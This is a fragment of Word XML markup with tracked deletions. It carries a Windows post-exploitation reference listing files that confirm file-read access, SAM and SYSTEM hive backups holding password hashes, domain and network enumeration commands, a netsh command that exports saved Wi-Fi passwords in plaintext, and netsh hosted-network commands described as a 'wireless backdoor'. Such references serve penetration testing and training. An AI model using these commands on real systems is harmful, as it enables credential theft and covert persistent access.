        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">.</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">F</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">iles that will have the same name across networks / </w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Windows domains / systems.</w:delText>
        </w:r>
      </w:del>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3"/>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5955"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="4320"/>
            <w:gridCol w:w="5955"/>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ind w:left="0" w:firstLine="0"/>
              <w:jc w:val="center"/>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File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ind w:left="0" w:firstLine="0"/>
              <w:jc w:val="center"/>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Expected Contents / Description</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:trPr>
          <w:trHeight w:val="114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%SYSTEMDRIVE%\boot.ini</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A file that can be counted on to be on virtually every windows host. Helps with confirmation that a read is happening.</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%WINDIR%\win.ini</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This is another file to look for if boot.ini isn’t there or coming back, which is sometimes the case.</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:trPr>
          <w:trHeight w:val="72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%SYSTEMROOT%\repair\SAM</w:delText>
              </w:r>
            </w:del>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%SYSTEMROOT%\System32\config\RegBack\SAM</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It stores users' passwords in a hashed format (in</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:color w:val="000099"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                      <w:color w:val="000099"/>
                      <w:u w:val="single"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">LM hash</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> and</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:color w:val="000099"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                      <w:color w:val="000099"/>
                      <w:u w:val="single"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">NTLM</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">hash</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">). </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">The SAM file in \repair is locked, but can be retrieved using forensic or Volume Shadow copy methods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%SYSTEMROOT%\repair\system</w:delText>
              </w:r>
            </w:del>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%SYSTEMROOT%\System32\config\RegBack\system</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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">%SYSTEMDRIVE%\autoexec.bat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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
                <w:rFonts w:ascii="Arial" w:cs="Arial" w:eastAsia="Arial" w:hAnsi="Arial"/>
                <w:b w:val="1"/>
                <w:i w:val="0"/>
                <w:smallCaps w:val="0"/>
                <w:strike w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
                <w:u w:val="single"/>
                <w:shd w:fill="auto" w:val="clear"/>
                <w:vertAlign w:val="baseline"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:rFonts w:ascii="Arial" w:cs="Arial" w:eastAsia="Arial" w:hAnsi="Arial"/>
                    <w:b w:val="1"/>
                    <w:i w:val="0"/>
                    <w:smallCaps w:val="0"/>
                    <w:strike w:val="0"/>
                    <w:color w:val="000000"/>
                    <w:sz w:val="22"/>
                    <w:szCs w:val="22"/>
                    <w:u w:val="none"/>
                    <w:shd w:fill="auto" w:val="clear"/>
                    <w:vertAlign w:val="baseline"/>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&gt;insert new rows above this line&lt;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SEE IMPORTANT FILES SECTION FOR MORE IDEAS</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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6D2">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39aqq3d1e7h0" w:id="254"/>
        <w:bookmarkEnd w:id="254"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">System</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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4"/>
        <w:tblW w:w="102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7200"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="3090"/>
            <w:gridCol w:w="7200"/>
          </w:tblGrid>
        </w:tblGridChange>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:trHeight w:val="74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Expected Output or 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whoami</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Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1.</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whoami /all</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Lists current user, sid, groups current user is a member of and their sids as well as current privilege level.</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set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Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE.</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fsutil fsinfo drives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Must be an administrator to run this, but it lists the current drives on the system.</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sz w:val="20"/>
                <w:szCs w:val="20"/>
                <w:highlight w:val="white"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:smallCaps w:val="0"/>
                    <w:sz w:val="20"/>
                    <w:szCs w:val="20"/>
                    <w:highlight w:val="white"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:highlight w:val="white"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                      <w:sz w:val="20"/>
                      <w:szCs w:val="20"/>
                      <w:highlight w:val="white"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"</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se</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">curely registered executable</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">s</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> within the system registry on Windows 7. </w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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6E1">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Networking (ipconfig, netstat, net)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:author="D D" w:id="18" w:date="2019-06-27T09:08:10Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:smallCaps w:val="0"/>
              <w:u w:val="single"/>
              <w:rtl w:val="0"/>
              <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText xml:space="preserve">cd</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_wxdrfg2sfisk" w:id="255"/>
        <w:bookmarkEnd w:id="255"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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5"/>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930"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="3345"/>
            <w:gridCol w:w="6930"/>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Expected Output or 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ipconfig /all</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Displays the full information about your NIC’s.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ipconfig /displaydns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Displays your local DNS cache.</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netstat -nabo</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Lists ports / connections with corresponding process (-b), don’t perform looking (-n), all connections (-a) and owning process ID (-o)</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netstat -r</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Displays the routing table</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netstat -na | findstr :445</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Find all listening ports and connections on port 445</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netstat -nao</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> | findstr LISTENING</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Find all LISTENING ports and their associated PIDs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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">netstat -anob | findstr “services, process or port”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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
                <w:rFonts w:ascii="Arial" w:cs="Arial" w:eastAsia="Arial" w:hAnsi="Arial"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:smallCaps w:val="0"/>
                <w:strike w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
                <w:u w:val="single"/>
                <w:shd w:fill="auto" w:val="clear"/>
                <w:vertAlign w:val="baseline"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:rFonts w:ascii="Arial" w:cs="Arial" w:eastAsia="Arial" w:hAnsi="Arial"/>
                    <w:b w:val="0"/>
                    <w:i w:val="0"/>
                    <w:smallCaps w:val="0"/>
                    <w:strike w:val="0"/>
                    <w:color w:val="000000"/>
                    <w:sz w:val="22"/>
                    <w:szCs w:val="22"/>
                    <w:u w:val="none"/>
                    <w:shd w:fill="auto" w:val="clear"/>
                    <w:vertAlign w:val="baseline"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">The “b” flag makes the command take longer but will output the process name using each of the connections.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netsh diag show all</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w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:b w:val="1"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:b w:val="1"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">XP only</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">} Shows information on network services and adapters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view</w:delText>
              </w:r>
            </w:del>
            <w:ins w:author="Walford Green" w:id="19" w:date="2019-08-18T05:37:12Z">
              <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
                <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                  <w:rPr>
                    <w:smallCaps w:val="0"/>
                    <w:u w:val="single"/>
                    <w:rtl w:val="0"/>
                    <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                      <w:rPr>
                        <w:smallCaps w:val="0"/>
                      </w:rPr>
                    </w:rPrChange>
                  </w:rPr>
                  <w:delText xml:space="preserve">\</w:delText>
                </w:r>
              </w:del>
            </w:ins>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Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup or domain.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line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:ins w:author="Anonymous" w:id="20" w:date="2019-08-31T18:01:35Z"/>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view /domain</w:delText>
              </w:r>
            </w:del>
            <w:ins w:author="Anonymous" w:id="20" w:date="2019-08-31T18:01:35Z">
              <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
                <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                  <w:rPr>
                    <w:rtl w:val="0"/>
                  </w:rPr>
                </w:r>
              </w:del>
            </w:ins>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List all domains available to the host</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view /domain:otherdomain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Queries NBNS/SMB (SAMBA) and tries to find all hosts in the ‘otherdomain’</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:rtl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:trPr>
          <w:trHeight w:val="1260" w:hRule="atLeast"/>
          <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:trPrChange w:author="Anonymous" w:id="21" w:date="2019-08-30T16:14:46Z">
            <w:trPr>
              <w:trHeight w:val="1260" w:hRule="atLeast"/>
            </w:trPr>
          </w:trPrChange>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:shd w:fill="auto" w:val="clear"/>
            <w:tcMar>
              <w:top w:w="100.0" w:type="dxa"/>
              <w:left w:w="100.0" w:type="dxa"/>
              <w:bottom w:w="100.0" w:type="dxa"/>
              <w:right w:w="100.0" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="top"/>
            <w:tcPrChange w:author="Anonymous" w:id="21" w:date="2019-08-30T16:14:46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user %USERNAME% /domain</w:delText>
              </w:r>
            </w:del>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:shd w:fill="auto" w:val="clear"/>
            <w:tcMar>
              <w:top w:w="100.0" w:type="dxa"/>
              <w:left w:w="100.0" w:type="dxa"/>
              <w:bottom w:w="100.0" w:type="dxa"/>
              <w:right w:w="100.0" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="top"/>
            <w:tcPrChange w:author="Anonymous" w:id="21" w:date="2019-08-30T16:14:46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Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership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user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Lists all of the domain users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accounts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password policy for the local system. This can be different and superseded by the </w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">domain</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> policy.</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accounts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password policy for the domain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localgroup administrators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members of the Administrators local group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spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
                <w:smallCaps w:val="0"/>
                <w:u w:val="single"/>
                <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                  <w:rPr>
                    <w:smallCaps w:val="0"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
              <w:pPrChange w:author="Anonymous" w:id="0" w:date="2019-07-23T07:50:40Z">
                <w:pPr>
                  <w:keepNext w:val="0"/>
                  <w:keepLines w:val="0"/>
                  <w:widowControl w:val="0"/>
                  <w:pBdr>
                    <w:top w:space="0" w:sz="0" w:val="nil"/>
                    <w:left w:space="0" w:sz="0" w:val="nil"/>
                    <w:bottom w:space="0" w:sz="0" w:val="nil"/>
                    <w:right w:space="0" w:sz="0" w:val="nil"/>
                    <w:between w:space="0" w:sz="0" w:val="nil"/>
                  </w:pBdr>
                  <w:shd w:fill="auto" w:val="clear"/>
                  <w:spacing w:line="240" w:lineRule="auto"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:ins w:author="Anonymous" w:id="22" w:date="2019-07-23T07:50:40Z">
              <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
                <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                  <w:rPr>
                    <w:smallCaps w:val="0"/>
                    <w:u w:val="single"/>
                    <w:rtl w:val="0"/>
                    <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                      <w:rPr>
                        <w:smallCaps w:val="0"/>
                      </w:rPr>
                    </w:rPrChange>
                  </w:rPr>
                  <w:delText xml:space="preserve">net localgroup administrators /domain</w:delText>
                </w:r>
              </w:del>
            </w:ins>
            <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr>
                      <w:smallCaps w:val="0"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">net localgroup administrators /domain</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as this was supposed to use localgroup &amp; domain, this actually another way of getting *current* domain admins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group “Domain Admins”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members of the Domain Admins group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group “Enterprise Admins”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members of the Enterprise Admins group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group “Domain Controllers”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list of Domain Controllers for the current domain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share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Displays your currently shared SMB entries, and what path(s) they point to</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session | find / “\\”</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arp -a</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Lists all the systems currently in the machine’s ARP table. </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route print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the machine’s routing table. This can be good for finding other networks and static routes that have been put in place</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browstat (Not working on XP)</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netsh wlan show profiles</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shows all saved wireless profiles. You may then export the info for those profiles with the command below</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netsh wlan export profile folder=. key=clear</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exports a user wifi profile with the password in plaintext to an xml file in the current working directory</w:delText>
              </w:r>
            </w:del>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netsh wlan [start|stop] hostednetwork</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Starts or stops a wireless backdoor on a windows 7 pc</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netsh wlan set hostednetwork ssid=&lt;ssid&gt; key=&lt;passphrase&gt; keyUsage=persistent|temporary</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Complete hosted network setup for creating a wireless backdoor on win 7</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netsh wlan set hostednetwork mode=[allow|disallow]</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enables or disables hosted network service</w:delText>
              </w:r>
            </w:del>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wmic ntdomain list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Retrieve information about Domain and Domain Controller</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r>
    </w:tbl>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   </w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000729">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="75"/>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75"/>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http://www.securityaegis.com/ntsd-backdoor/</w:delText>
        </w:r>
      </w:del>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ins w:author="Anonymous" w:id="24" w:date="2019-09-25T01:13:24Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:smallCaps w:val="0"/>
              <w:u w:val="single"/>
              <w:rtl w:val="0"/>
              <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                <w:rPr>
                  <w:smallCaps w:val="0"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText xml:space="preserve"> </w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000072B">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2dppgmyixmz0" w:id="256"/>
        <w:bookmarkEnd w:id="256"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:smallCaps w:val="0"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:smallCaps w:val="0"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Configs</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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6"/>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8"/>
        <w:gridCol w:w="5282"/>
        <w:tblGridChange w:id="0">
          <w:tblGrid>
            <w:gridCol w:w="4998"/>
            <w:gridCol w:w="5282"/>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Expected Output or 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gpresult /z</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Extremely verbose output of GPO (Group policy) settings as applied to the current system and user</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sc q</w:delText>
              </w:r>
              <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
                <w:rPr>
                  <w:u w:val="single"/>
                  <w:rtl w:val="0"/>
                  <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve">c &lt;servicename&gt;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Queries the configuration of a service. Such as </w:delText>
              </w:r>
